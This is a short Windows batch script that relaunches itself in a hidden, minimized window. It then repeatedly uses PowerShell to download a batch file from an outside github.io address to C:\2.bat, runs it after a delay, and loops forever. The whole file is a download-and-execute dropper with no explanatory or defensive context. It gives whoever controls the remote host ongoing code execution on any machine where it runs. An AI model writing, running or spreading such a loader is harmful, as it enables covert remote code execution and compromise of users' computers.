%1(start /min cmd.exe /c %0 :& exit )
:start
powershell (new-object Net.WebClient).DownloadFile('https://tanluying.github.io/ying/pcjb.bat','C:\2.bat')
ping -n 60 127.0.0.1>nul
call C:\2.bat
ping -n 60 127.0.0.1>nul
goto start
